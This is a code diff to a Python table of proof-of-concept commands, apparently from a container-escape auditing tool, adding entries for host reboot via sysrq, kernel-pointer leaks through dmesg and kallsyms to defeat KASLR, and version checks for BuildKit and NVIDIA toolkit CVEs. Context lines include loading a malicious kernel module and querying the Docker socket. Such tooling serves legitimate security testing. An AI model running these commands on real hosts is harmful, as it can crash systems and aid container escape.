@@ -44,6 +44,11 @@ POC_TEMPLATES: dict[str, str] = {
         "# Build a .ko whose init calls call_usermodehelper to run: {payload_command}\n"
         "make -C /lib/modules/$(uname -r)/build M=/tmp modules && insmod /tmp/evil.ko"
     ),
+    "cap_sys_boot": ("# Reboot the host node (DANGEROUS)\necho b > /proc/sysrq-trigger  # or: reboot(2)"),
+    "cap_syslog": (
+        "# Leak kernel pointers to defeat KASLR\ndmesg | grep -iE 'kasan|0xffffffff' | head; "
+        "grep -i kernel /proc/kallsyms | head"
+    ),
     # ── MOUNT ─────────────────────────────────────────────────────
     "docker_socket_mount": ("curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"),
     "procfs_core_pattern": (
@@ -186,6 +191,12 @@ POC_TEMPLATES: dict[str, str] = {
         "# Requires BuildKit < 0.12.5 / Docker < 25.0.2\n"
         "docker version 2>/dev/null | grep -i version || echo 'docker version unknown'"
     ),
+    "cve_2024_23653": (
+        "# CVE-2024-23653: BuildKit unchecked security.insecure entitlement\n"
+        "# A malicious build runs a privileged container and escapes to the host\n"
+        "# Requires BuildKit < 0.12.5 / Docker < 25.0.2\n"
+        "docker version 2>/dev/null | grep -i version || echo 'docker version unknown'"
+    ),
     "lsm_apparmor_unconfined": (
         "# AppArmor is unconfined — no MAC restrictions\ncat /proc/self/attr/current  # Should show 'unconfined'"
     ),
@@ -212,6 +223,12 @@ POC_TEMPLATES: dict[str, str] = {
     "cve_2024_0132": (
         "# CVE-2024-0132: NVIDIA Container Toolkit host filesystem access\n"
         "# Requires specially crafted container image targeting toolkit < 1.16.2\n"
+        "ls /dev/nvidia* 2>/dev/null\n"
+        "nvidia-container-toolkit --version 2>/dev/null || echo 'toolkit version unknown'"
+    ),
+    "cve_2024_0133": (
+        "# CVE-2024-0133: NVIDIA Container Toolkit symlink host file write\n"
+        "# Crafted image symlinks a mount target so the toolkit writes host files\n"
         "ls /dev/nvidia* 2>/dev/null\n"
         "nvidia-container-toolkit --version 2>/dev/null || echo 'toolkit version unknown'"
     ),
